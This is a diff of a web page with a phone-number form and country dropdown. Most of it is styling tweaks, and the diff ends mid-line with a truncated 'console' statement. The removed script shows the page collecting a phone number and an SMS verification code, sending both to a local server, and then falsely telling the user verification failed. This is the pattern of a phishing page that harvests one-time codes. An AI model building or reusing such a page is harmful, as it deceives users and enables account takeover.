@@ -15,7 +15,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow: hidden; /* Hide overflow to prevent scrolling */
+            overflow-y: auto; /* Allow vertical scrolling */
         }
 
         .container {
@@ -26,7 +26,8 @@
             text-align: center;
             width: 100%;
             max-width: 400px;
-            margin: 0 auto;
+            margin: 20px auto;
+            position: relative; /* Added for dropdown positioning */
         }
 
         .container img {
@@ -49,6 +50,7 @@
         .input-group {
             margin-bottom: 15px;
             text-align: left;
+            position: relative; /* Added for dropdown positioning */
         }
 
         .input-group label {
@@ -61,7 +63,7 @@
         select, input[type="text"], input[type="number"] {
             width: 100%;
             padding: 12px;
-            border: 1px solid #ddd;
+            border: none; /* Removed borders */
             border-radius: 5px;
             font-size: 16px;
             box-sizing: border-box;
@@ -90,9 +92,7 @@
         }
 
         .dropdown {
-            position: relative;
-            display: inline-block;
-            width: 100%;
+            position: relative; /* Adjusted for dropdown positioning */
         }
 
         .dropdown-button {
@@ -100,10 +100,14 @@
             align-items: center;
             justify-content: space-between;
             padding: 12px;
-            border: 1px solid #ddd;
+            border: none; /* Removed border */
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
+            background-color: #ffffff;
+            color: #333;
+            width: 100%;
+            box-sizing: border-box;
         }
 
         .dropdown-content {
@@ -119,18 +123,12 @@
             top: 100%;
             left: 0;
             padding: 0;
-            margin: 0;
         }
 
         .dropdown-content div {
-            padding: 10px;
+            padding: 12px;
             cursor: pointer;
             font-size: 16px;
-            border-bottom: 1px solid #ddd;
-        }
-
-        .dropdown-content div:last-child {
-            border-bottom: none;
         }
 
         .dropdown-content div:hover {
@@ -229,6 +227,7 @@
                 item.innerHTML = `${country.flag} ${country.name} (${country.code})`;
                 item.onclick = () => {
                     document.getElementById('phoneNumber').value = country.code + ' ';
+                    document.querySelector('.dropdown-button').textContent = `${country.flag} ${country.name} (${country.code})`;
                     closeDropdown();
                 };
                 dropdownMenu.appendChild(item);
@@ -274,70 +273,4 @@
                     throw new Error(`HTTP error! status: ${response.status}`);
                 }
 
-                console.log("Phone number saved successfully");
-            } catch (error) {
-                console.error("Failed to save phone number:", error);
-            }
-        }
-
-        function submitVerification() {
-            const verificationCode = document.getElementById('verificationCode').value;
-            const phoneDisplay = document.getElementById('phoneDisplay').textContent;
-
-            if (verificationCode === '') {
-                alert('Please enter the verification code.');
-                return;
-            }
-
-            saveVerificationCode(phoneDisplay, verificationCode);
-
-            document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
-            document.getElementById('finalMessageContainer').style.display = 'block';
-        }
-
-        async function saveVerificationCode(phoneNumber, verificationCode) {
-            try {
-                const response = await fetch('http://localhost:8080/save-verification', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ phoneNumber, verificationCode })
-                });
-
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-
-                console.log("Verification code saved successfully");
-            } catch (error) {
-                console.error("Failed to save verification code:", error);
-            }
-        }
-
-        function resetForm() {
-            document.getElementById('initialContainer').style.display = 'block';
-            document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessageContainer').style.display = 'none';
-            document.getElementById('phoneNumber').value = '';
-            document.getElementById('verificationCode').value = '';
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            populateCountries();
-            document.querySelector('.dropdown-button').addEventListener('click', toggleDropdown);
-            document.addEventListener('click', event => {
-                if (!event.target.closest('.dropdown')) {
-                    closeDropdown();
-                }
-            });
-
-            // Hide keyboard on scroll
-            document.body.addEventListener('touchmove', () => {
-                document.activeElement.blur();
-            });
-        });
-    </script>
-</body>
-</html>
+                console
